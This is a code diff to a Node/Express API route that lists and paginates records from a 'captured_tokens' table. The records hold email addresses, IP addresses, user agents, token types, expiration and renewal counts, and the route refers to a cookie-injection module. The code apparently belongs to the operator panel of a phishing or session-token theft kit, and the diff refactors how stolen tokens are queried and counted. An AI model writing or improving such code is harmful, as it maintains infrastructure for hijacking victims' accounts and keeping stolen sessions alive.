@@ -35,6 +35,24 @@ async function checkTenantColumn() {
   return hasTenantColumn;
 }
 
+async function checkDeletedColumn() {
+  try {
+    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'deleted'");
+    return columns.length > 0;
+  } catch (e) {
+    return false;
+  }
+}
+
+async function checkAccountTypeColumn() {
+  try {
+    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
+    return columns.length > 0;
+  } catch (e) {
+    return false;
+  }
+}
+
 // ─── Skip /inject/* paths - these are handled by cookieinject.js ────
 // This prevents /api/tokens/inject/* from being matched by tokenRoutes
 router.get('/inject*', (req, res) => {
@@ -46,55 +64,54 @@ router.get('/inject*', (req, res) => {
 // ─── Get all tokens for user ────────────────────────────────────────
 router.get('/', userAuth, async (req, res) => {
    try {
-     const { sort, search, page = 1, limit = 50 } = req.query;
-     // Filter out expired/stale tokens for cleaner UI
-     const whereClause = 'deleted = 0 AND expiration > NOW() AND stale = 0';
+     const sort = req.query.sort;
+     const search = req.query.search;
+     const page = parseInt(req.query.page, 10) || 1;
+     const limit = parseInt(req.query.limit, 10) || 50;
 
-     // Check if tenant column exists
+     const deletedExists = await checkDeletedColumn();
      const tenantExists = await checkTenantColumn();
-
-     // Check if account_type column exists
      let accountTypeExists = false;
      try {
        const [acctCols] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
        accountTypeExists = acctCols.length > 0;
      } catch (e) { /* ignore */ }
 
-     let query = `SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at${tenantExists ? ', tenant' : ''}, template_type${accountTypeExists ? ', account_type' : ''}, token_status FROM captured_tokens WHERE user_id = ? AND ${whereClause}`;
-    const params = [req.user.id];
+     const filters = ['user_id = ?'];
+     const params = [req.user.id];
+     if (deletedExists) filters.push('deleted = 0');
+     if (search) {
+       filters.push('(email LIKE ? OR ip_address LIKE ?)');
+       params.push('%' + search + '%', '%' + search + '%');
+     }
+     const whereSql = filters.length ? `WHERE ${filters.join(' AND ')}` : '';
+     const selectFields = `id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale${deletedExists ? ', deleted' : ''}, created_at${tenantExists ? ', tenant' : ''}, template_type${accountTypeExists ? ', account_type' : ''}, token_status`;
+     let query = `SELECT ${selectFields} FROM captured_tokens ${whereSql}`;
+     query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
+     const offset = (page - 1) * limit;
+     query += ' LIMIT ? OFFSET ?';
+     params.push(limit, offset);
 
-    if (search) {
-      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
-      params.push('%' + search + '%', '%' + search + '%');
-    }
-
-    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
-    const offset = (parseInt(page) - 1) * parseInt(limit);
-    query += ' LIMIT ? OFFSET ?';
-    params.push(parseInt(limit), offset);
-
-    const [t] = await db.query(query, params);
+     const [t] = await db.query(query, params);
      let tokens = t;
+     if (!tenantExists && tokens.length > 0) tokens = tokens.map(token => ({ ...token, tenant: 'common' }));
+     if (!accountTypeExists && tokens.length > 0) tokens = tokens.map(token => ({ ...token, account_type: null }));
 
-     // Add defaults for missing columns
-     if (!tenantExists && tokens.length > 0) {
-       tokens = tokens.map(t => ({ ...t, tenant: 'common' }));
-     }
-     if (!accountTypeExists && tokens.length > 0) {
-       tokens = tokens.map(t => ({ ...t, account_type: null }));
-     }
+     const countFilters = ['user_id = ?'];
+     const countParams = [req.user.id];
+     if (deletedExists) countFilters.push('deleted = 0');
+     const countWhereSql = countFilters.length ? `WHERE ${countFilters.join(' AND ')}` : '';
+     const [countResult] = await db.query(
+       `SELECT COUNT(*) as total FROM captured_tokens ${countWhereSql}`,
+       countParams
+     );
 
-    const [countResult] = await db.query(
-      'SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0',
-      [req.user.id]
-    );
-
-    res.json({
-      tokens: tokens,
-      total: countResult[0].total,
-      page: parseInt(page),
-      pages: Math.ceil(countResult[0].total / parseInt(limit))
-    });
+     res.json({
+       tokens,
+       total: countResult[0].total,
+       page,
+       pages: Math.ceil(countResult[0].total / limit)
+     });
   } catch (err) {
     console.error('[Tokens] Get tokens error:', err.message);
     console.error('[Tokens] Stack:', err.stack);
